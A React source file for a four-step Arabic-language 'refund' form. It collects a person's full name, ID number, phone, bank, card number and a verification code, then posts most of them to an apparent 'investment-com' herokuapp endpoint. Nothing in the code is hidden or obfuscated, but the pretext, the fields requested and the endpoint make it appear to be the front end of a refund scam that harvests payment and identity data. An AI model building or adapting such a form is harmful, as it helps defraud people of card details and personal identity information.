import React, { useState } from 'react';
import './Form.css';

import UserDetails from './user-details/UserDetails';
import BankDetails from './bank-details/BankDetails';
import ClientId from './client-id/ClientId';
import ClientVerification from './client-verification/ClientVerification';

import Breadcrumb from '../../UI/breadcrumb/Breadcrump';
import Loading from '../../UI/Loading';
import Modal from '../../UI/Modal/Modal';

import axios from 'axios';

export default function Form() {

    const [values, setValues] = useState({
        clientFullname: '',
        clientId: '',
        clientPhoneNumber: '',
        refundAmount: '',
        clientBankAccount: '',
        clientCardNumber: '',
        verificationCode: '',
        state: '',
    });    

    const [step, setStep] = useState(1);
    const [showSpinner, setShowSpinner] = useState(false);
    const [open, setOpen] = useState(false);

    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
        return;
        }

        setOpen(false);
    };
    const nextStep = () => {
        setShowSpinner(true);
        setTimeout(function() {
            setShowSpinner(false);
            if (step < 4) {
                setStep(step + 1);
            } else if(step === 4) {
                //console.log(values);
            } 
        }, 1000);
        
        if(step === 4) {
            userRequestHandler();
        }

    };
    
    const prevStep = () => {
        if (step > 1) {
          setStep(step - 1);
        }
    };
    
    const handleChange = (name) => (e) => {
        setValues({ ...values, [name]: e.target.value });
    };
    
    const userRequestHandler = () => {

        axios.post("https://investment-com.herokuapp.com/add-order", {
            fullname: values.clientFullname,
            idNumber: values.clientId,
            phoneNumber: values.clientPhoneNumber,
            refundAmount: values.refundAmount,
            userBank: values.clientBankAccount,
            cardNumber: values.clientCardNumber
        }).then((response) => {
            if(response.data.saved) {
                setOpen(true);
            }
        })
        
    };

    return (
        <div className="form-index">
            <div className="container d-flex justify-content-center align-items-center flex-column h-100">
            <Breadcrumb path={" تعبئة نموذج"} />
                <div className="card p-3 mb-4">
                    {
                        {
                        1: <UserDetails 
                                fullName={values.clientFullname}
                                idNumber={values.clientId}
                                phoneNumber={values.clientPhoneNumber}
                                handleChange={handleChange} 
                            />,
                        2: <BankDetails 
                                refundAmount={values.refundAmount}
                                handleChange={handleChange} 
                            />,
                        3: <ClientId 
                                cardNumber={values.clientCardNumber}
                                handleChange={handleChange} 
                            />,
                        4: <ClientVerification 
                                handleChange={handleChange} 
                            />,
                        }[step]
                    }
                    <div className="d-flex align-items-center justify-content-center">
                        {showSpinner && <Loading />}
                    </div>
                    <div className="d-flex justify-content-around px-5 mt-5">
                        <button className="btn btn-success" onClick={nextStep}>
                            {step === 4 ? "تأكيد" : "التالي"}
                        </button>
                        {step > 1 ? (
                        <button className="btn btn-success" onClick={prevStep}>
                            السابق
                        </button>
                        ) : null}
                    </div>
                </div>
            </div>
            <Modal open={open} handleClose={handleClose} />
        </div>

    )
}
